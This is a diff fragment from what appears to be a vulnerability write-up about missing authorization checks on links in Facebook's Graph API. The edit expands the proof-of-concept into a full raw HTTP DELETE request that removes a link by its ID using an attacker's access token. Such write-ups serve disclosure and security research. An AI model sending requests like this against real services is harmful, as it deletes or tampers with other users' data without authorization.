@@ -34,7 +34,12 @@ The generated link is associated with a unique ID. Due to missing authorization 
 
 ### 📤 Request
 ```http
-DELETE https://graph.facebook.com/v10.0/{ID_LINK}
+DELETE /{ID_LINK}&access_token={Attacker_Token} HTTP/1.1
+Host: graph.facebook.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Connection: close
 ```
 
 ### ✅ Response
